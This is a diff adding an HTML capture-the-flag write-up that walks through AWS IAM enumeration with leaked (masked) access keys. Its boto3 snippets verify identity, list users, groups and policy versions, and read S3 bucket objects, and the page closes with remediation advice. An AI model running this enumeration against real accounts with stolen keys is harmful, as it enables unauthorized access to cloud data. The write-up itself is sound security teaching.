@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF Writeup: AWS IAM Enumeration — Asgard Vault</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0b0f;
+      --bg2: #0f1117;
+      --bg3: #161820;
+      --border: #1e2130;
+      --accent: #f97316;
+      --accent2: #fb923c;
+      --green: #22c55e;
+      --blue: #38bdf8;
+      --purple: #a78bfa;
+      --red: #f87171;
+      --text: #e2e8f0;
+      --muted: #64748b;
+      --code-bg: #0d0f16;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Syne', sans-serif;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    /* Noise texture overlay */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 0;
+      opacity: 0.5;
+    }
+
+    .container {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 0 24px;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Header */
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 20px 0;
+      position: sticky;
+      top: 0;
+      background: rgba(10, 11, 15, 0.92);
+      backdrop-filter: blur(12px);
+      z-index: 100;
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .nav-brand {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+    }
+
+    .nav-tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    /* Hero */
+    .hero {
+      padding: 80px 0 60px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .category-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--accent);
+      background: rgba(249, 115, 22, 0.08);
+      border: 1px solid rgba(249, 115, 22, 0.2);
+      padding: 5px 12px;
+      border-radius: 4px;
+      margin-bottom: 28px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .category-tag::before {
+      content: '▶';
+      font-size: 8px;
+    }
+
+    h1 {
+      font-size: clamp(32px, 5vw, 52px);
+      font-weight: 800;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+      margin-bottom: 20px;
+      background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      color: var(--muted);
+      max-width: 600px;
+      line-height: 1.6;
+      margin-bottom: 36px;
+    }
+
+    .meta-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 24px;
+      align-items: center;
+    }
+
+    .meta-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .meta-item .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--accent);
+    }
+
+    .difficulty {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--green);
+      background: rgba(34, 197, 94, 0.08);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    /* Tags */
+    .tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 28px;
+    }
+
+    .tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--blue);
+      background: rgba(56, 189, 248, 0.06);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    /* Content */
+    .content {
+      padding: 60px 0;
+    }
+
+    /* TL;DR Box */
+    .tldr {
+      background: rgba(249, 115, 22, 0.06);
+      border: 1px solid rgba(249, 115, 22, 0.2);
+      border-left: 3px solid var(--accent);
+      border-radius: 8px;
+      padding: 24px 28px;
+      margin-bottom: 48px;
+    }
+
+    .tldr-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .tldr p {
+      font-size: 15px;
+      color: #cbd5e1;
+      line-height: 1.6;
+    }
+
+    /* Flag box */
+    .flag-box {
+      background: rgba(34, 197, 94, 0.06);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      border-radius: 8px;
+      padding: 20px 24px;
+      margin: 32px 0;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .flag-icon {
+      font-size: 28px;
+      flex-shrink: 0;
+    }
+
+    .flag-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--green);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+
+    .flag-value {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--green);
+    }
+
+    /* Section headings */
+    h2 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #fff;
+      margin: 56px 0 20px;
+      letter-spacing: -0.01em;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    h2::before {
+      content: attr(data-num);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--accent);
+      background: rgba(249, 115, 22, 0.1);
+      border: 1px solid rgba(249, 115, 22, 0.2);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: 700;
+    }
+
+    h3 {
+      font-size: 18px;
+      font-weight: 700;
+      color: #cbd5e1;
+      margin: 32px 0 12px;
+    }
+
+    p {
+      font-size: 16px;
+      color: #94a3b8;
+      margin-bottom: 16px;
+      line-height: 1.75;
+    }
+
+    strong {
+      color: #e2e8f0;
+      font-weight: 700;
+    }
+
+    /* Code blocks */
+    .code-block {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: var(--bg3);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .code-lang {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .code-dots {
+      display: flex;
+      gap: 6px;
+    }
+
+    .code-dots span {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .code-dots span:nth-child(1) { background: #ff5f57; }
+    .code-dots span:nth-child(2) { background: #febc2e; }
+    .code-dots span:nth-child(3) { background: #28c840; }
+
+    pre {
+      padding: 20px;
+      overflow-x: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.65;
+    }
+
+    .kw { color: #c792ea; }
+    .str { color: #c3e88d; }
+    .fn { color: #82aaff; }
+    .cm { color: #546e7a; font-style: italic; }
+    .var { color: #f78c6c; }
+    .num { color: #f78c6c; }
+    .key { color: #89ddff; }
+
+    code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--blue);
+      background: rgba(56, 189, 248, 0.08);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+
+    /* Info/warning boxes */
+    .info-box {
+      background: rgba(56, 189, 248, 0.06);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      border-left: 3px solid var(--blue);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .info-box p {
+      margin: 0;
+      font-size: 14px;
+      color: #93c5fd;
+    }
+
+    .warning-box {
+      background: rgba(251, 146, 60, 0.06);
+      border: 1px solid rgba(251, 146, 60, 0.15);
+      border-left: 3px solid var(--accent2);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .warning-box p {
+      margin: 0;
+      font-size: 14px;
+      color: #fdba74;
+    }
+
+    /* Attack flow diagram */
+    .attack-flow {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 32px;
+      margin: 32px 0;
+    }
+
+    .flow-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+    }
+
+    .flow-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    .flow-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 16px;
+      position: relative;
+    }
+
+    .flow-step:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      left: 18px;
+      top: 36px;
+      width: 1px;
+      height: calc(100% - 12px);
+      background: var(--border);
+    }
+
+    .flow-num {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(249, 115, 22, 0.1);
+      border: 1px solid rgba(249, 115, 22, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--accent);
+      flex-shrink: 0;
+      position: relative;
+      z-index: 1;
+    }
+
+    .flow-content {
+      padding: 6px 0 28px;
+    }
+
+    .flow-label {
+      font-size: 15px;
+      font-weight: 700;
+      color: #e2e8f0;
+      margin-bottom: 4px;
+    }
+
+    .flow-desc {
+      font-size: 13px;
+      color: var(--muted);
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    /* Vuln cards */
+    .vuln-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 16px;
+      margin: 24px 0;
+    }
+
+    .vuln-card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      transition: border-color 0.2s;
+    }
+
+    .vuln-card:hover {
+      border-color: rgba(249, 115, 22, 0.3);
+    }
+
+    .vuln-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--accent);
+      margin-bottom: 8px;
+    }
+
+    .vuln-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #e2e8f0;
+      margin-bottom: 8px;
+    }
+
+    .vuln-desc {
+      font-size: 13px;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    /* JSON output display */
+    .json-output {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 20px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      line-height: 1.7;
+      overflow-x: auto;
+      color: #a8b4c8;
+    }
+
+    .json-key { color: #89ddff; }
+    .json-str { color: #c3e88d; }
+    .json-num { color: #f78c6c; }
+
+    /* Divider */
+    .divider {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 48px 0;
+    }
+
+    /* Key finding highlight */
+    .finding {
+      background: linear-gradient(135deg, rgba(167, 139, 250, 0.08), rgba(249, 115, 22, 0.04));
+      border: 1px solid rgba(167, 139, 250, 0.2);
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin: 24px 0;
+    }
+
+    .finding-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: var(--purple);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+
+    .finding p {
+      margin: 0;
+      font-size: 15px;
+      color: #c4b5fd;
+    }
+
+    /* Footer */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 40px 0;
+      margin-top: 40px;
+    }
+
+    .footer-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .footer-text {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .footer-badge {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--green);
+      background: rgba(34, 197, 94, 0.08);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      padding: 4px 12px;
+      border-radius: 4px;
+    }
+
+    @media (max-width: 600px) {
+      .meta-row { flex-direction: column; gap: 12px; }
+      h2 { font-size: 22px; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <nav class="nav">
+      <span class="nav-brand">RedFox CTF</span>
+      <span class="nav-tag">writeup / cloud / aws</span>
+    </nav>
+  </div>
+</header>
+
+<div class="container">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="category-tag">Cloud Security · AWS IAM</div>
+    <h1>Halls of Asgard:<br>AWS IAM Enumeration</h1>
+    <p class="subtitle">How a single leaked access key, inherited group permissions, and stale policy versions led to a full AWS environment compromise.</p>
+
+    <div class="meta-row">
+      <div class="meta-item">
+        <span class="dot"></span>
+        <span>RedFox CTF 2026</span>
+      </div>
+      <div class="meta-item">
+        <span class="dot"></span>
+        <span>Category: Cloud / AWS</span>
+      </div>
+      <div class="meta-item">
+        <span class="dot"></span>
+        <span>Challenge: IAM Enumeration</span>
+      </div>
+      <div class="difficulty">MEDIUM</div>
+    </div>
+
+    <div class="tags">
+      <span class="tag">aws</span>
+      <span class="tag">iam</span>
+      <span class="tag">s3</span>
+      <span class="tag">credential-leak</span>
+      <span class="tag">privilege-escalation</span>
+      <span class="tag">policy-enumeration</span>
+      <span class="tag">boto3</span>
+    </div>
+  </section>
+
+  <!-- Content -->
+  <article class="content">
+
+    <!-- TL;DR -->
+    <div class="tldr">
+      <div class="tldr-label">TL;DR</div>
+      <p>We were given leaked AWS credentials for user <strong>ian.miller</strong>. By chaining read-only IAM permissions, we discovered inherited group policies, an exposed S3 bucket name, and ultimately found the flag hidden inside an old <strong>policy version's Resource ARN</strong> — a classic case of sensitive data leakage in places nobody thinks to look.</p>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag</div>
+        <div class="flag-value">REDFOX{IAM_ENUMERATION_MASTERED}</div>
+      </div>
+    </div>
+
+    <!-- Challenge Description -->
+    <h2 data-num="01">Challenge Description</h2>
+    <p>The challenge presented us with the following lore prompt:</p>
+    <div class="info-box">
+      <p><em>"The halls of Asgard are governed by strict policies, each defining who may access the power of the realms. A set of credentials has surfaced — seemingly ordinary, yet tied to a larger system of permissions and roles. The structure is vast, and not everything is immediately visible. Some secrets are not hidden... only undiscovered. Explore the policies and uncover what the system reveals to those who know where to look."</em></p>
+    </div>
+    <p>We were handed the following credentials:</p>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">credentials</span>
+      </div>
+      <pre><span class="var">access_key_id</span>     = <span class="str">"AK**********"</span>
+<span class="var">secret_access_key</span> = <span class="str">"R**********"</span>
+<span class="var">user_name</span>         = <span class="str">"ian.miller"</span></pre>
+    </div>
+
+    <!-- Phase 1 -->
+    <h2 data-num="02">Phase 1 — Identity Verification</h2>
+    <p>The very first thing you always do with any leaked AWS credentials — verify they work and establish who you are. <code>sts:GetCallerIdentity</code> requires <strong>zero permissions</strong> and always succeeds with valid credentials.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python</span>
+      </div>
+      <pre><span class="kw">import</span> boto3, json
+
+session = boto3.Session(
+    aws_access_key_id=<span class="str">"AK**********"</span>,
+    aws_secret_access_key=<span class="str">"R**********"</span>,
+    region_name=<span class="str">"ap-south-1"</span>
+)
+
+sts = session.client(<span class="str">'sts'</span>)
+identity = sts.get_caller_identity()
+<span class="fn">print</span>(json.dumps(identity, indent=<span class="num">2</span>, default=str))</pre>
+    </div>
+
+    <p><strong>Output:</strong></p>
+    <div class="json-output">
+{<br>
+&nbsp;&nbsp;<span class="json-key">"UserId"</span>: <span class="json-str">"AI*********"</span>,<br>
+&nbsp;&nbsp;<span class="json-key">"Account"</span>: <span class="json-str">"739147174912"</span>,<br>
+&nbsp;&nbsp;<span class="json-key">"Arn"</span>: <span class="json-str">"arn:aws:iam::739147174912:user/ian.miller"</span><br>
+}
+    </div>
+
+    <div class="info-box">
+      <p><strong>Key takeaway:</strong> The account ID <code>739147174912</code> is now known and will be used in every subsequent ARN construction. Always start here.</p>
+    </div>
+
+    <!-- Phase 2 -->
+    <h2 data-num="03">Phase 2 — Direct Policy Enumeration</h2>
+    <p>Next we enumerated what permissions <code>ian.miller</code> had directly attached to his user account.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python</span>
+      </div>
+      <pre>iam = session.client(<span class="str">'iam'</span>)
+
+<span class="cm"># List directly attached policies</span>
+policies = iam.list_attached_user_policies(UserName=<span class="str">'ian.miller'</span>)
+<span class="fn">print</span>(policies[<span class="str">'AttachedPolicies'</span>])
+
+<span class="cm"># Read the policy document</span>
+arn = <span class="str">'arn:aws:iam::739147174912:policy/iam-read-identity'</span>
+policy = iam.get_policy(PolicyArn=arn)
+vid = policy[<span class="str">'Policy'</span>][<span class="str">'DefaultVersionId'</span>]
+doc = iam.get_policy_version(PolicyArn=arn, VersionId=vid)
+<span class="fn">print</span>(doc[<span class="str">'PolicyVersion'</span>][<span class="str">'Document'</span>])</pre>
+    </div>
+
+    <p>The policy <code>iam-read-identity</code> granted the following actions:</p>
+    <div class="json-output">
+<span class="json-key">"Action"</span>: [<br>
+&nbsp;&nbsp;<span class="json-str">"iam:ListUsers"</span>, <span class="json-str">"iam:GetUser"</span>,<br>
+&nbsp;&nbsp;<span class="json-str">"iam:ListRoles"</span>, <span class="json-str">"iam:GetRole"</span>,<br>
+&nbsp;&nbsp;<span class="json-str">"iam:ListGroups"</span>, <span class="json-str">"iam:GetGroup"</span><br>
+]
+    </div>
+
+    <p>Not very exciting on its own — but it gave us the ability to enumerate the entire IAM structure, which is exactly what we needed next.</p>
+
+    <!-- Phase 3 -->
+    <h2 data-num="04">Phase 3 — User & Group Enumeration</h2>
+    <p>Using <code>iam:ListUsers</code> we mapped all 15 users in the account. Several stood out immediately:</p>
+
+    <div class="vuln-grid">
+      <div class="vuln-card">
+        <div class="vuln-num">USER_01</div>
+        <div class="vuln-title">backup</div>
+        <div class="vuln-desc">Old account created Nov 2025, last used Dec 2025. Stale privileged accounts are prime targets.</div>
+      </div>
+      <div class="vuln-card">
+        <div class="vuln-num">USER_02</div>
+        <div class="vuln-title">dev-2-admin</div>
+        <div class="vuln-desc">"admin" in the username suggests elevated permissions worth investigating.</div>
+      </div>
+      <div class="vuln-card">
+        <div class="vuln-num">USER_03</div>
+        <div class="vuln-title">snaptic-s3</div>
+        <div class="vuln-desc">"s3" in the username hints at S3 bucket access. Had an active access key.</div>
+      </div>
+      <div class="vuln-card">
+        <div class="vuln-num">USER_04</div>
+        <div class="vuln-title">pentest</div>
+        <div class="vuln-desc">Pentest accounts often have broad permissions. Also had an active access key.</div>
+      </div>
+    </div>
+
+    <p>Then we enumerated groups — and this is where it got interesting:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python</span>
+      </div>
+      <pre><span class="cm"># List all groups and their members/policies</span>
+groups = iam.list_groups()
+<span class="kw">for</span> g <span class="kw">in</span> groups[<span class="str">'Groups'</span>]:
+    attached = iam.list_attached_group_policies(GroupName=g[<span class="str">'GroupName'</span>])
+    members = iam.get_group(GroupName=g[<span class="str">'GroupName'</span>])
+    <span class="fn">print</span>(g[<span class="str">'GroupName'</span>], <span class="str">'→'</span>, [p[<span class="str">'PolicyName'</span>] <span class="kw">for</span> p <span class="kw">in</span> attached[<span class="str">'AttachedPolicies'</span>]])
+    <span class="fn">print</span>(<span class="str">'  members:'</span>, [u[<span class="str">'UserName'</span>] <span class="kw">for</span> u <span class="kw">in</span> members[<span class="str">'Users'</span>]])</pre>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">⚡ Critical Discovery</div>
+      <p><code>ian.miller</code> was a member of the <strong>consultants</strong> group, which had <code>iam-read-policy</code> attached — a completely different, more powerful policy that was NOT visible from his direct user policies!</p>
+    </div>
+
+    <!-- Phase 4 -->
+    <h2 data-num="05">Phase 4 — Inherited Policy & S3 Bucket Discovery</h2>
+    <p>Reading the <code>iam-read-policy</code> document revealed three sections. The third one was the goldmine:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python</span>
+      </div>
+      <pre>arn = <span class="str">'arn:aws:iam::739147174912:policy/iam-read-policy'</span>
+policy = iam.get_policy(PolicyArn=arn)
+vid = policy[<span class="str">'Policy'</span>][<span class="str">'DefaultVersionId'</span>]
+doc = iam.get_policy_version(PolicyArn=arn, VersionId=vid)
+<span class="fn">print</span>(json.dumps(doc[<span class="str">'PolicyVersion'</span>][<span class="str">'Document'</span>], indent=<span class="num">2</span>))</pre>
+    </div>
+
+    <div class="json-output">
+<span class="cm">// Section 1: More IAM read permissions</span><br>
+<span class="json-key">"Action"</span>: [<span class="json-str">"iam:ListPolicies"</span>, <span class="json-str">"iam:GetPolicy"</span>, <span class="json-str">"iam:ListPolicyVersions"</span>, ...]<br><br>
+<span class="cm">// Section 2: S3 bucket access — name leaked in policy!</span><br>
+<span class="json-key">"Action"</span>: [<span class="json-str">"s3:ListBucket"</span>, <span class="json-str">"s3:GetBucketLocation"</span>],<br>
+<span class="json-key">"Resource"</span>: <span class="json-str">"arn:aws:s3:::iam-enum-bucket-secrets"</span><br><br>
+<span class="cm">// Section 3: Full S3 object access</span><br>
+<span class="json-key">"Action"</span>: [<span class="json-str">"s3:GetObject"</span>, <span class="json-str">"s3:PutObject"</span>, <span class="json-str">"s3:DeleteObject"</span>, ...],<br>
+<span class="json-key">"Resource"</span>: <span class="json-str">"arn:aws:s3:::iam-enum-bucket-secrets/*"</span>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Vulnerability:</strong> The bucket name <code>iam-enum-bucket-secrets</code> was leaked directly in the policy document. In real environments, policy documents often reveal internal bucket names, account IDs, and resource names that attackers can target.</p>
+    </div>
+
+    <!-- Phase 5 -->
+    <h2 data-num="06">Phase 5 — S3 Bucket Enumeration</h2>
+    <p>With the bucket name and access permissions in hand, we listed the bucket contents:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python</span>
+      </div>
+      <pre>s3 = session.client(<span class="str">'s3'</span>, region_name=<span class="str">'ap-south-1'</span>)
+bucket = <span class="str">'iam-enum-bucket-secrets'</span>
+
+objects = s3.list_objects_v2(Bucket=bucket)
+<span class="kw">for</span> obj <span class="kw">in</span> objects[<span class="str">'Contents'</span>]:
+    <span class="fn">print</span>(obj[<span class="str">'Key'</span>])
+    content = s3.get_object(Bucket=bucket, Key=obj[<span class="str">'Key'</span>])
+    <span class="fn">print</span>(content[<span class="str">'Body'</span>].read().decode())</pre>
+    </div>
+
+    <p>This returned two files — <code>exploit.txt</code> containing "hello" and <code>test.txt</code> containing "pwned". Both were decoys. The real flag was elsewhere.</p>
+
+    <!-- Phase 6 -->
+    <h2 data-num="07">Phase 6 — Policy Version Enumeration (The Flag)</h2>
+    <p>Since <code>iam-read-policy</code> also gave us <code>iam:ListPolicies</code> and <code>iam:ListPolicyVersions</code>, we enumerated all local policies and — crucially — <strong>all their versions</strong>:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python</span>
+      </div>
+      <pre><span class="cm"># List all local policies</span>
+all_policies = iam.list_policies(Scope=<span class="str">'Local'</span>)
+
+<span class="kw">for</span> policy <span class="kw">in</span> all_policies[<span class="str">'Policies'</span>]:
+    arn = policy[<span class="str">'Arn'</span>]
+    
+    <span class="cm"># Get ALL versions, not just the default</span>
+    versions = iam.list_policy_versions(PolicyArn=arn)
+    
+    <span class="kw">for</span> v <span class="kw">in</span> versions[<span class="str">'Versions'</span>]:
+        doc = iam.get_policy_version(PolicyArn=arn, VersionId=v[<span class="str">'VersionId'</span>])
+        <span class="fn">print</span>(<span class="str">f"Policy: {policy['PolicyName']} | Version: {v['VersionId']}"</span>)
+        <span class="fn">print</span>(json.dumps(doc[<span class="str">'PolicyVersion'</span>][<span class="str">'Document'</span>], indent=<span class="num">2</span>))</pre>
+    </div>
+
+    <p>The <code>minimal-access-policy</code> had TWO versions. Both contained the flag hidden inside the <strong>Resource ARN field</strong> — not in any actual data, but embedded in the policy structure itself:</p>
+
+    <div class="json-output">
+<span class="cm">// Version v1</span><br>
+{<br>
+&nbsp;&nbsp;<span class="json-key">"Action"</span>: [<span class="json-str">"iam:list*"</span>],<br>
+&nbsp;&nbsp;<span class="json-key">"Effect"</span>: <span class="json-str">"Deny"</span>,<br>
+&nbsp;&nbsp;<span class="json-key">"Resource"</span>: <span class="json-str">"arn:aws:iam::123456789012:user/<strong>FLAG{IAM_ENUMERATION_MASTERED}</strong>"</span><br>
+}<br><br>
+<span class="cm">// Version v2</span><br>
+{<br>
+&nbsp;&nbsp;<span class="json-key">"Action"</span>: [<span class="json-str">"iam:list*"</span>],<br>
+&nbsp;&nbsp;<span class="json-key">"Effect"</span>: <span class="json-str">"Deny"</span>,<br>
+&nbsp;&nbsp;<span class="json-key">"Resource"</span>: <span class="json-str">"arn:aws:iam::123456789012:user/<strong>REDFOX{IAM_ENUMERATION_MASTERED}</strong>"</span><br>
+}
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag Found!</div>
+        <div class="flag-value">REDFOX{IAM_ENUMERATION_MASTERED}</div>
+      </div>
+    </div>
+
+    <!-- Attack Flow -->
+    <h2 data-num="08">Attack Flow</h2>
+
+    <div class="attack-flow">
+      <div class="flow-title">// complete attack chain</div>
+      <div class="flow-steps">
+        <div class="flow-step">
+          <div class="flow-num">1</div>
+          <div class="flow-content">
+            <div class="flow-label">Leaked Credentials</div>
+            <div class="flow-desc">access_key_id + secret_access_key for ian.miller</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">2</div>
+          <div class="flow-content">
+            <div class="flow-label">Identity Verification</div>
+            <div class="flow-desc">sts:GetCallerIdentity → account ID 739147174912</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">3</div>
+          <div class="flow-content">
+            <div class="flow-label">Direct Policy Read</div>
+            <div class="flow-desc">iam-read-identity → ListUsers, ListRoles, ListGroups</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">4</div>
+          <div class="flow-content">
+            <div class="flow-label">Group Membership Discovery</div>
+            <div class="flow-desc">ian.miller ∈ consultants group → inherits iam-read-policy</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">5</div>
+          <div class="flow-content">
+            <div class="flow-label">S3 Bucket Name Leaked</div>
+            <div class="flow-desc">iam-read-policy Resource ARN → iam-enum-bucket-secrets</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">6</div>
+          <div class="flow-content">
+            <div class="flow-label">Policy Version Enumeration</div>
+            <div class="flow-desc">minimal-access-policy v1/v2 → flag in Resource ARN</div>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">7</div>
+          <div class="flow-content">
+            <div class="flow-label">Flag Captured</div>
+            <div class="flow-desc">REDFOX{IAM_ENUMERATION_MASTERED}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Vulnerabilities -->
+    <h2 data-num="09">Vulnerabilities & Lessons</h2>
+
+    <h3>1. Leaked Credentials</h3>
+    <p>The root cause of everything. AWS access keys for <code>ian.miller</code> were exposed, giving an attacker an initial foothold. This is the most common AWS attack vector — keys found in GitHub repos, CI/CD configs, environment variables, Docker images, and more.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Rotate credentials immediately when exposed. Use IAM roles instead of long-term access keys wherever possible. Enable AWS CloudTrail to detect key usage anomalies.</p>
+    </div>
+
+    <h3>2. Indirect Permission Inheritance</h3>
+    <p><code>ian.miller</code> had minimal direct permissions but inherited powerful S3 and IAM read permissions through the <code>consultants</code> group. Most automated tools and security reviews only check direct user policies — group membership is often overlooked.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Always audit permissions at ALL levels — user, group, and role. Use AWS IAM Access Analyzer to identify overly permissive policies across the entire account.</p>
+    </div>
+
+    <h3>3. Sensitive Resource Names in Policy Documents</h3>
+    <p>The S3 bucket name <code>iam-enum-bucket-secrets</code> was directly visible in the policy's <code>Resource</code> field. This is information leakage — attackers learn what internal resources exist just by reading policies they have access to.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Be aware that policy documents containing resource ARNs are readable by anyone with <code>iam:GetPolicyVersion</code>. Consider using resource tags and condition keys instead of hardcoded ARNs where possible.</p>
+    </div>
+
